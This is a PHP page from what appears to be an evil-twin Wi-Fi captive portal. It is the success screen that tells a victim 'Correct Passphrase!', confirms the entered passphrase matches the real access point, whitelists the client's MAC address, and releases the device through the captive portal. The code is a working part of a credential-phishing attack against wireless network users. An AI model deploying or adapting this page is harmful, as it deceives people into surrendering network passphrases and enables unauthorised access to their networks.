<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "";
require_once('helper.php');
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

$rueayFilePath = '/tmp/airport_rueay.txt';
$aclAllowFilePath = '/tmp/airport_aclallow.txt';

// Check if true is found in the file airport_rueay.txt and the referer is checking.php
if (
    file_exists($rueayFilePath) &&
    strpos(file_get_contents($rueayFilePath), 'true') !== false &&
    isset($_SERVER['HTTP_REFERER']) &&
    strpos($_SERVER['HTTP_REFERER'], '/checking.php') !== false
) {
    // Continue with the normal behavior

    // Check if true is found in the file and generate message
    if (
        file_exists($aclAllowFilePath) &&
        strpos(file_get_contents($aclAllowFilePath), 'true') !== false
    ) {
        $ACLMessage = 'Added: ' . getClientMac($_SERVER['REMOTE_ADDR']) . ' to ACL Allowed List.';
    }
} else {
    // Redirect to checking.php if conditions are not met
    header("Location: /checking.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <link rel="stylesheet" href="/css/bootstrap-4.3.1.min.css">
    <script type="text/javascript" src="/js/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="/style.css">
    <script type="text/javascript" src="/func.js"></script>
    <script type="text/javascript">
        var destinationValue = "<?php $destination; ?>";

        function auth_success(targetValue) {
            var xhr = new XMLHttpRequest();
            var url = "/captiveportal/index.php";
            var params = "target=" + encodeURIComponent(targetValue);

            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    console.log(xhr.responseText);
                }
            };

            xhr.send(params);
        }
        auth_success(destinationValue); // Call auth_success with the initial value
    </script>
    <title><?= $ssid ?></title>
</head>

<body>
    <div class="container mt-5">
        <div class="form-row justify-content-center">
            <div class="col-md-6">
                <div class="card rounded-lg border-light shadow">
                    <div class="card-body text-center">
                        <h3 class="card-title text-center">Correct Passphrase!</h3>
                        <p class="text-center small">The passphrase you entered matches that of the Wireless Access Point. You may temporarily lose connection, do not worry, you will be connected back automatically.</p>
                        <p class="text-center small">You may now close this page and continue as normal.</p>
                        <p class="text-left small text-muted mt-4 d-flex justify-content-between align-items-center">
                            STATUS: INFO_AUTH_SUCCESS
                        </p>
                        <?php
                        if (isset($ACLMessage)) {
                            echo '<p class="text-left small text-muted d-flex justify-content-between align-items-center">' . $ACLMessage . '</p>';
                        }
                        ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>